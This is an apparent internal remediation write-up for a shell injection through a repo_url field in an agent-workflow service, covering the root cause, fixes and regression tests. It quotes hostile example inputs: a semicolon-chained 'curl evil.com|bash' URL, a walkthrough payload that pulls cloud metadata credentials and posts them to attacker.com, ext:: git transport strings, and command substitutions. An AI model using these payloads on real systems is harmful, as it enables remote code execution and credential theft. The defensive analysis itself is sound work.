# GAP-0079: repo_url Shell Injection (Latent) — Remediation Write-up

> ~5 pages. Fix-oriented. Verified against actual codebase 2026-06-05; claim is **partially
> correct but the cited location is inaccurate** — see Section 1 for the corrected assessment.

## 1. Summary & Classification

- **Severity**: HIGH (latent) — `repo_url` is f-stringed into shell command strings that
  are stored as workflow step `command` fields; if these are executed via a shell interpreter
  in prod, semicolons or extended git transports enable arbitrary code execution.
- **Source ticket**: AGENT-002 · **Status**: Open
- **Owning area**: `app/services/agent_coder.py:578`,
  `app/services/agent_architect.py:1153`, `app/models.py:5283`
- **Related tickets**: GAP-0078 (custom_install_commands injection), AGENT-002,
  AGENT-008 (Coder Agent), AGENT-011 (Architect Agent), SECOPS-007 (dev/prod parity)

**Verdict: CLAIM PARTIALLY CORRECT — location corrected.**

The ticket cited `app/services/agent_worker_provisioner.py` as the injection site. That
file stores `repo_url` as a plain DDB field but **never** f-strings it into a shell
command. The real injection is in two other service files:

| Actual injection site | Line | Shell string produced |
|---|---|---|
| `app/services/agent_coder.py` | 578 | `f"git clone {repo_url} /workspace && cd /workspace && git fetch origin"` |
| `app/services/agent_architect.py` | 1153 | `f"git clone --depth 1 -b {branch} {repo_url} /workspace"` |

Additionally, `app/models.py:5283` (`CreateWorkerIn.repo_url`) accepts any string up to 500
characters with no URL-scheme validation, while the coder and architect config models
(`CoderConfigIn` and `ArchitectConfigIn`) do validate `https://` or `git@` but do **not**
block shell metacharacters.

**One-line impact**: A user who controls `repo_url` can inject shell commands that execute
with the worker's OS privileges when the prod agent runtime invokes the workflow step.

## 2. Current-State Investigation (root cause)

### The actual injection sites

**Site 1 — `app/services/agent_coder.py`, function `build_coder_workflow` (line 574):**

```python
repo_url = cfg.get("repo_url", "")
...
steps: List[Dict[str, Any]] = [
    {
        "step_id": 1,
        "type": "clone_repo",
        "command": f"git clone {repo_url} /workspace && cd /workspace && git fetch origin",
        # ^ repo_url injected directly into shell string
        "timeout_seconds": 120,
        "on_failure": "escalate",
    },
    ...
]
```

**Site 2 — `app/services/agent_architect.py`, function `build_architect_workflow` (line 1150):**

```python
steps: List[Dict[str, Any]] = [
    {"step_id": 1, "type": "clone_repo",
     "command": f"git clone --depth 1 -b {branch} {repo_url} /workspace",
     # ^ repo_url injected directly into shell string
     "timeout_seconds": 120, "on_failure": "escalate"},
    ...
]
```

Both sites f-string the raw `repo_url` value into a `command` field stored in the `agent_runs`
DynamoDB table. The `command` field is intended to be the literal shell string passed to the
agent runtime when the workflow step executes.

### What the GAP-0079 ticket got wrong

The ticket pointed to `app/services/agent_worker_provisioner.py`. That file does store
`repo_url` in the worker's DynamoDB item (line 227: `"repo_url": repo_url`), but it never
builds a shell command string from it — it only passes `repo_url` to `create_worker` and
stores it. The actual f-string construction happens in the coder and architect agent services.

### Validation gap in `CoderConfigIn` and `ArchitectConfigIn`

Both models in `app/models.py` include a `@field_validator("repo_url")` that checks:

```python
if not (v.startswith("https://") or v.startswith("git@")):
    raise ValueError("Repository URL must start with https:// or git@")
if " " in v:
    raise ValueError("Repository URL must not contain spaces")
return v
```

This blocks:
- Plain HTTP URLs and local paths.
- URLs with embedded spaces.

This does **not** block:
- Semicolons: `https://github.com/user/repo;curl http://evil.com|bash`
- Backticks: `` https://github.com/user/repo`id` ``
- `$(...)` command substitution: `https://github.com/user/repo$(whoami)`
- Newlines embedded in the URL.
- Git extended transport protocols: `ext::sh -c "id">/tmp/x;git clone ...`

### Validation gap in `CreateWorkerIn`

`app/models.py:5283`:
```python
repo_url: str = Field(default="", max_length=500)
```

No validator at all. Any string up to 500 characters is accepted and stored. Although the
worker-level `repo_url` is not yet used in `build_coder_workflow` (that function reads
from `coder_config.repo_url`, not `worker.repo_url`), the field is propagated through
`agent_fleet.py` and `agent_memory.py` context injection, and may be used in future
workflow steps.

### Current execution gating

`AGENT_CODER_EXECUTE_COMMANDS` environment variable (`S.agent_coder_execute_commands`,
default `False`) gates whether the workflow steps are actually dispatched to a real
runtime. The module docstring (`agent_coder.py` line 13) states:

> "Real shell/git/PR execution is gated behind `S.agent_coder_execute_commands`. When
> disabled (the default, and always in E2E), the workflow is generated and its transitions
> are driven in-memory so tests are deterministic."

This means the vulnerability is latent in two senses:
1. The malicious `command` string is stored in DDB today.
2. It is only executed when `AGENT_CODER_EXECUTE_COMMANDS=1` is set — not the default,
   and not set in dev.

However, the poisoned data lives in DynamoDB and waits for the flag to be enabled in prod.

### Dev vs prod manifestation

- **Dev mode (`AGENT_CODER_EXECUTE_COMMANDS=0`)**: Workflow steps are generated and stored
  but driven in-memory by `run_mock_workflow`. No shell execution occurs. The injection
  is pre-positioned but inert.
- **Prod mode (`AGENT_CODER_EXECUTE_COMMANDS=1`)**: The agent runtime dispatches each
  step's `command` string to the worker host. If dispatched via `shell=True` or embedded
  in a bash heredoc, the injection fires.

## 3. Impact / Exploit / Blast Radius

### Exploit walkthrough — Coder Agent

1. Attacker is an authenticated user with ADMIN or ROOT access (required to configure
   a `CoderConfigIn` via `PUT /ui/agent-coder/types/{type_id}/config`).
2. Sets `repo_url = "https://github.com/user/repo;curl http://169.254.169.254/latest/meta-data/iam/security-credentials/default | curl -d @- https://attacker.com"`.
3. `CoderConfigIn._validate_repo_url` passes because the string starts with `https://`
   and contains no spaces.
4. Triggers a coder agent run for any ticket.
5. `build_coder_workflow` stores:
   ```
   "command": "git clone https://github.com/user/repo;curl http://169.254.169.254/... /workspace && ..."
   ```
6. When `AGENT_CODER_EXECUTE_COMMANDS=1` and the runtime calls
   `subprocess.run(step["command"], shell=True)`, the semicolon splits the command:
   - `git clone https://github.com/user/repo` — fails or succeeds.
   - `curl http://169.254.169.254/...` — exfiltrates IMDS credentials.

### Exploit walkthrough — Architect Agent (same path, lower privilege requirement)

The `ArchitectConfigIn` validator is identical to `CoderConfigIn`. Both are writable by
ADMIN/ROOT roles.

### Using `ext::` git transport (no metacharacters needed)

Git supports the `ext::` protocol: `ext::sh -c "id>/tmp/p;git clone ..."`. This string:
- Starts with `ext::` — fails the `https://` or `git@` check only if the validator
  is present. `CreateWorkerIn.repo_url` has no validator, so this is immediately exploitable
  from that path.
- Against `CoderConfigIn`/`ArchitectConfigIn`, blocked by the existing validator.

### Blast radius

- **Worker host OS**: Full compromise once the command executes on the provisioned VM.
- **LLM API key**: Decrypted by the provisioner and injected as an env var; capturable
  from `/proc/self/environ`.
- **AWS credentials**: EC2 instance profile credentials via IMDS.
- **Repository secrets**: The target git repo and any secrets in the workspace.
- **Scope**: Limited to ADMIN/ROOT users for the coder/architect config paths. The
  `CreateWorkerIn.repo_url` path is accessible to all authenticated users.

## 4. Fix Design (code-level)

### Fix 1 — Shared `repo_url` validator module

Create `app/core/validate_url.py`:

```python
"""Shared URL validation utilities."""
import re

# Shell metacharacters that must not appear in a repo URL
_SHELL_META_RE = re.compile(r'[;&|`$<>(){}\n\r\t\x00-\x1f]')
# Git ext:: transport and other dangerous protocols
_DANGEROUS_PROTO_RE = re.compile(r'^(ext::|fd::|fd://|file://|/|\.\.)', re.IGNORECASE)
# Only https:// and git@ are permitted
_ALLOWED_PROTO_RE   = re.compile(r'^(https://|git@)')

def validate_repo_url(v: str) -> str:
    """Validate a repository URL for safe use in shell command strings.
    
    Allows: https://... and git@host:user/repo
    Rejects: shell metacharacters, dangerous protocols, spaces, control chars.
    """
    if not v:
        return v
    if not _ALLOWED_PROTO_RE.match(v):
        raise ValueError("Repository URL must start with https:// or git@")
    if _DANGEROUS_PROTO_RE.match(v):
        raise ValueError("Repository URL uses a dangerous protocol")
    if _SHELL_META_RE.search(v):
        raise ValueError("Repository URL contains forbidden shell metacharacters")
    if len(v) > 500:
        raise ValueError("Repository URL too long (max 500)")
    return v
```

### Fix 2 — Apply validator to all `repo_url` fields

**`app/models.py`, `CreateWorkerIn` (line 5283):**

```python
from app.core.validate_url import validate_repo_url

class CreateWorkerIn(BaseModel):
    ...
    repo_url: str = Field(default="", max_length=500)

    @field_validator("repo_url")
    @classmethod
    def _validate_repo_url(cls, v: str) -> str:
        return validate_repo_url(v) if v else v
```

**`app/models.py`, `CoderConfigIn` (line 6579) and `ArchitectConfigIn` (line 6797):**

Replace the existing thin validators with `validate_repo_url`:

```python
@field_validator("repo_url")
@classmethod
def _validate_repo_url(cls, v: str) -> str:
    from app.core.validate_url import validate_repo_url
    return validate_repo_url(v)
```

### Fix 3 — Use `subprocess` argv form, not shell string, for the `command` field

The root fix is to prevent shell interpretation entirely. In `build_coder_workflow` and
`build_architect_workflow`, store the git command as an **argv list** rather than a shell
string:

```python
# agent_coder.py — BEFORE (vulnerable)
"command": f"git clone {repo_url} /workspace && cd /workspace && git fetch origin",

# agent_coder.py — AFTER (safe)
"command": None,                          # shell string field left empty
"argv": ["git", "clone", "--", repo_url, "/workspace"],  # structured, shell-free
"post_argv": ["git", "-C", "/workspace", "fetch", "origin"],
```

The agent runtime that consumes this field must invoke:

```python
import subprocess
result = subprocess.run(step["argv"], shell=False, capture_output=True, timeout=120)
```

The `--` separator before `repo_url` prevents git from interpreting the URL as a flag
even if it starts with `-`.

Similarly for the architect:

```python
# agent_architect.py — AFTER (safe)
"argv": ["git", "clone", "--depth", "1", "-b", branch, "--", repo_url, "/workspace"],
```

### Dev/Prod parity (SECOPS-007)

All three fixes are pure Python validation/code changes:

- `app/core/validate_url.py` is env-agnostic.
- The Pydantic validators run at request time before any DDB write — same in dev and prod.
- Switching `command` to `argv` list changes the DDB schema for `agent_runs` workflow
  steps; the runtime (which does not yet exist in prod) reads this field, so no migration
  is needed. The mock runtime in `run_mock_workflow` (agent_coder.py:876) does not
  execute commands at all, so it is unaffected by the format change.

No new AWS services, flags, or environment variables are required.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline, fails-before / passes-after)

```python
"""Regression test for GAP-0079 — repo_url shell injection."""
import pytest
from pydantic import ValidationError
from app.models import CreateWorkerIn, CoderConfigIn, ArchitectConfigIn

WORKER_BASE = dict(
    label="test", agent_type="coder", tool="claude_code",
    compute_type="ec2", instance_type="t3.medium", llm_key_id="k1",
)

CODER_BASE = dict(
    repo_url="https://github.com/safe/repo",
    test_commands=["pytest"],
)

# --- CreateWorkerIn ---

def test_worker_repo_url_rejects_semicolon():
    """After fix: semicolons in worker repo_url are rejected."""
    with pytest.raises(ValidationError, match="metacharacter|forbidden"):
        CreateWorkerIn(**WORKER_BASE,
                       repo_url="https://github.com/user/repo;curl http://evil.com|bash")


def test_worker_repo_url_rejects_ext_transport():
    """After fix: ext:: transport is rejected."""
    with pytest.raises(ValidationError, match="https://|git@|protocol"):
        CreateWorkerIn(**WORKER_BASE, repo_url="ext::sh -c 'id>/tmp/p'")


def test_worker_repo_url_accepts_https():
    """After fix: a clean https URL is accepted."""
    m = CreateWorkerIn(**WORKER_BASE, repo_url="https://github.com/org/repo.git")
    assert m.repo_url == "https://github.com/org/repo.git"


def test_worker_repo_url_accepts_git_at():
    """After fix: a clean git@ SSH URL is accepted."""
    m = CreateWorkerIn(**WORKER_BASE, repo_url="git@github.com:org/repo.git")
    assert m.repo_url == "git@github.com:org/repo.git"


# --- CoderConfigIn ---

def test_coder_repo_url_rejects_backtick():
    """After fix: backticks in coder repo_url are rejected."""
    with pytest.raises(ValidationError, match="metacharacter|forbidden"):
        CoderConfigIn(**CODER_BASE, repo_url="https://github.com/repo`id`")


def test_coder_repo_url_rejects_dollar_paren():
    """After fix: $() command substitution is rejected."""
    with pytest.raises(ValidationError, match="metacharacter|forbidden"):
        CoderConfigIn(**CODER_BASE, repo_url="https://github.com/repo$(whoami)")


# --- build_coder_workflow produces argv, not shell string ---

def test_coder_workflow_clone_step_uses_argv(mock_ddb):
    """After fix: clone_repo step uses argv list, not a shell command string."""
    from app.services.agent_coder import build_coder_workflow
    config = {"repo_url": "https://github.com/org/repo", "test_commands": ["pytest"],
              "branch_pattern": "feat/{ticket_id}-{slug}", "skill_level": "mid",
              "max_ticket_time_seconds": 600, "test_timeout_seconds": 300}
    ticket = {"ticket_id": "T-1", "subject": "Fix bug"}
    workflow = build_coder_workflow(agent_run_id="r1", config=config, ticket=ticket)
    clone_step = next(s for s in workflow["steps"] if s["type"] == "clone_repo")
    # Before fix: clone_step["command"] is a shell string containing repo_url
    # After fix:  clone_step["argv"] is a list; "command" is None
    assert clone_step.get("command") is None
    assert clone_step["argv"] == [
        "git", "clone", "--", "https://github.com/org/repo", "/workspace"
    ]
```

Log rejected `repo_url` values at WARNING level (truncated) with the user sub to detect
active probing:

```python
logger.warning("repo_url_validation_failed user_id=%s url_prefix=%.40s", user_id, v[:40])
```

### Rollout

- **Effort**: S–M. The `validate_url.py` helper is ~20 lines. Applying it to three model
  classes is straightforward. The `argv` workflow step change requires coordination with
  the agent runtime team to update the step consumer format.
- **Risk**: LOW for the validation changes — they reject previously-accepted malformed input.
  MEDIUM for the `argv` schema change — it changes the DDB record format for `agent_runs`
  workflow steps. If any consumer reads `command` today, it needs updating.
- **Sequencing**: Validation changes can ship first (immediately closes the storage injection
  vector). The `argv` workflow change ships when the prod runtime is being implemented.
- **Rollback**: Remove the new validator import and revert the `CoderConfigIn` /
  `ArchitectConfigIn` validators to the original two-check form. No data loss.
